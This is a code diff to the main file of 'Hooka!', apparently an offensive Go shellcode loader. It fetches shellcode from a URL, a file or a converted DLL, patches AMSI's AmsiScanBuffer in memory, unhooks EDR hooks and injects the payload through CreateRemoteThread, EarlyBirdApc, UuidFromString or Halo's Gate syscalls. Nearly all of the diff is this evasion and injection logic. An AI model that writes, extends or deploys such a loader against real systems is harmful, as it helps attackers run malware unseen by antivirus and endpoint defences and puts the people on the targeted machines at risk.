@@ -20,7 +20,7 @@ func main() {
   var err error
 
   // Parse CLI flags and retrieve values
-  sc_url, sc_file, dll_file, technique, hook_detect, _, unhook, base64_flag, hex_flag, test_flag, lsass := core.ParseFlags()
+  sc_url, sc_file, dll_file, technique, hook_detect, halos, unhook, base64_flag, hex_flag, test_flag, amsi, lsass := core.ParseFlags()
 
   l.PrintBanner("Hooka!") // Print script banner with version
   l.Println(" by D3Ext - v0.1")
@@ -49,6 +49,13 @@ func main() {
     l.Println("\n[-] Error: you can't use --file and --dll at the same time!\n")
 
   } else if (sc_url != "") && (sc_file == "") && (dll_file == "") {
+
+    if (technique != "CreateRemoteThread") && (technique != "CreateProcess") && (technique != "EarlyBirdApc") && (technique != "UuidFromString") && (technique != "") {
+      l.Println()
+      flag.PrintDefaults()
+      l.Println("\n[-] Unknown injection technique! See help panel\n")
+      os.Exit(0)
+    }
 
     if (base64_flag) && (hex_flag) { // Check if both flags were passed
       l.Println()
@@ -100,14 +107,16 @@ func main() {
       time.Sleep(300 * time.Millisecond)
     }
 
-    l.Println("[*] Patching AMSI by overwriting function memory address...")
-    time.Sleep(200 * time.Millisecond)
-    err = core.PatchAmsi()
-    if err != nil {
-      l.Println("[-] An error has ocurred while overwriting memory!")
-      l.Fatal(err)
+    if (amsi) {
+      l.Println("[*] Patching AMSI by overwriting AmsiScanBuffer memory address...")
+      time.Sleep(200 * time.Millisecond)
+      err = core.PatchAmsi()
+      if err != nil {
+        l.Println("[-] An error has ocurred while overwriting memory!")
+        l.Fatal(err)
+      }
+      time.Sleep(200 * time.Millisecond)
     }
-    time.Sleep(300 * time.Millisecond)
 
     // Unhook function(s)
     if (unhook == 1) {
@@ -146,10 +155,19 @@ func main() {
       l.Println("[*] Injecting shellcode using " + technique + " function")
     }
 
-    err = core.InjectWithTechnique(shellcode, technique) // Inject shellcode
-    if err != nil { // Handle error
-      l.Fatal(err)
+    if (halos) { // Check if --halos flag was used
+      err := core.InjectHalos(shellcode, technique)
+      if err != nil {
+        l.Fatal(err)
+      }
+
+    } else {
+      err = core.Inject(shellcode, technique) // Inject shellcode w/o halo's gate
+      if err != nil { // Handle error
+        l.Fatal(err)
+      }
     }
+    
     time.Sleep(100 * time.Millisecond)
     l.Println("[+] Shellcode should have been executed without errors!\n")
 
@@ -207,14 +225,16 @@ func main() {
       time.Sleep(300 * time.Millisecond)
     }
 
-    l.Println("[*] Patching AMSI by overwriting function memory address...")
-    time.Sleep(200 * time.Millisecond)
-    err = core.PatchAmsi()
-    if err != nil {
-      l.Println("[-] An error has ocurred while overwriting memory!")
-      l.Fatal(err)
+    if (amsi) {
+      l.Println("[*] Patching AMSI by overwriting AmsiScanBuffer memory address...")
+      time.Sleep(200 * time.Millisecond)
+      err = core.PatchAmsi()
+      if err != nil {
+        l.Println("[-] An error has ocurred while overwriting memory!")
+        l.Fatal(err)
+      }
+      time.Sleep(200 * time.Millisecond)
     }
-    time.Sleep(300 * time.Millisecond)
 
     // Unhook function(s)
     if (unhook == 1) {
@@ -254,10 +274,20 @@ func main() {
       l.Println("[*] Injecting shellcode using " + technique + " technique")
     }
 
-    err = core.InjectWithTechnique(shellcode, technique) // Inject shellcode
-    if err != nil { // Handle error
-      l.Fatal(err)
+    if (halos) { // Check if --halos flag was used
+      err := core.InjectHalos(shellcode, technique)
+      if err != nil {
+        l.Fatal(err)
+      }
+
+    } else {
+      err = core.Inject(shellcode, technique) // Inject shellcode w/o halo's gate
+      if err != nil { // Handle error
+        l.Fatal(err)
+      }
     }
+    
+    time.Sleep(100 * time.Millisecond)
     l.Println("[+] Shellcode should have been executed without errors!\n")
 
   } else if (sc_url == "") && (sc_file == "") && (dll_file != "") {
@@ -290,7 +320,7 @@ func main() {
     }
     time.Sleep(300 * time.Millisecond)
 
-    l.Println("[*] Converting " + dll_filename + " to position independant shellcode")
+    l.Println("[*] Converting " + dll_filename + " to shellcode")
     shellcode, err := core.ConvertDllToShellcode(dll_filename, dll_func, "") // Convert DLL to shellcode
     if err != nil { // Handle error
       l.Fatal(err)
@@ -299,14 +329,16 @@ func main() {
     l.Println("[+] Process finished successfully!")
     time.Sleep(200 * time.Millisecond)
 
-    l.Println("[*] Patching AMSI by overwriting function memory address...")
-    time.Sleep(200 * time.Millisecond)
-    err = core.PatchAmsi()
-    if err != nil {
-      l.Println("[-] An error has ocurred while overwriting memory!")
-      l.Fatal(err)
+    if (amsi) {
+      l.Println("[*] Patching AMSI by overwriting AmsiScanBuffer memory address...")
+      time.Sleep(200 * time.Millisecond)
+      err = core.PatchAmsi()
+      if err != nil {
+        l.Println("[-] An error has ocurred while overwriting memory!")
+        l.Fatal(err)
+      }
+      time.Sleep(200 * time.Millisecond)
     }
-    time.Sleep(300 * time.Millisecond)
 
     // Unhook function(s)
     if (unhook == 1) {
@@ -346,10 +378,19 @@ func main() {
       l.Println("[*] Injecting shellcode using " + technique + " technique")
     }
 
-    err = core.InjectWithTechnique(shellcode, technique) // Inject shellcode
-    if err != nil { // Handle error
-      l.Fatal(err)
+    if (halos) {
+      err = core.InjectHalos(shellcode, technique)
+      if err != nil {
+        l.Fatal(err)
+      }
+
+    } else {
+      err = core.Inject(shellcode, technique) // Inject shellcode w/o halo's gate
+      if err != nil { // Handle error
+        l.Fatal(err)
+      }
     }
+
     time.Sleep(100 * time.Millisecond)
     l.Println("[+] Shellcode should have been executed without errors!\n")
 
@@ -380,10 +421,25 @@ func main() {
 
   } else if (sc_url == "") && (sc_file == "") && (!hook_detect) && (test_flag) {
     
-    l.Println("\n[*] Testing shellcode injection with calc.exe shellcode")
+    l.Println("\n[*] Testing with calc.exe shellcode")
     time.Sleep(200 * time.Millisecond)
 
-    err := core.InjectWithTechnique(core.CalcShellcode(), technique) // Inject calc.exe shellcode
+    if (amsi) {
+      l.Println("[*] Patching AMSI by overwriting AmsiScanBuffer memory address...")
+      time.Sleep(200 * time.Millisecond)
+      err = core.PatchAmsi()
+      if err != nil {
+        l.Println("[-] An error has ocurred while overwriting memory!")
+        l.Fatal(err)
+      }
+      time.Sleep(200 * time.Millisecond)
+    }
+
+    if (technique != "") {
+      l.Println("[*] Injecting shellcode using " + technique + " technique")
+    }
+
+    err := core.Inject(core.CalcShellcode(), technique) // Inject calc.exe shellcode
     if err != nil { // Handle error
       l.Fatal(err)
     }
